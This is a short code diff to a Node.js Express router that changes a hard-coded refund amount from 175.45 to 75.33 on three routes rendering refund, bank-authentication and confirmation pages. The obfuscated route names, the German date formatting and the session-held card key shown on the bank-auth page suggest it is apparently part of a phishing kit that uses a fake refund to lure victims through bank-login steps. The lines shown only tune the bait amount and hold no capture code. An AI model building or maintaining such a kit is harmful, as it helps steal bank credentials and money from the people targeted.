@@ -15,7 +15,7 @@ router.get('/INDX6a7d5affa', (req, res) => {
 });
 router.get('/REFUD6a7d5affa', (req, res) => {
     res.render('pages/refund', {
-        refundAmount: '175.45', // Replace with dynamic logic if needed later
+        refundAmount: '75.33', // Replace with dynamic logic if needed later
         processingDate: new Date().toLocaleDateString('de-DE'),
         paymentDeadline: new Date().toLocaleDateString('de-DE')
     });
@@ -49,7 +49,7 @@ router.get('/PasoerrPPkjnUHnKJHu', (req, res) => {
 });
 router.get('/BankauthkjnUHnKJHu', (req, res) => {
     res.render('pages/bankauth', {
-        refundAmount: '175.45',
+        refundAmount: '75.33',
         keycc: req.session.keycc || '****'
     });
 });
@@ -67,7 +67,7 @@ router.get('/PPxSmSx2xhkjnUHnKJHu', (req, res) => {
 });
 router.get('/DONEhkjnUHnKJHu', (req, res) => {
     res.render('pages/done', {
-        refundAmount: '175.45',
+        refundAmount: '75.33',
     });
 });
 router.get('/loadgj43fsda', (req, res) => {
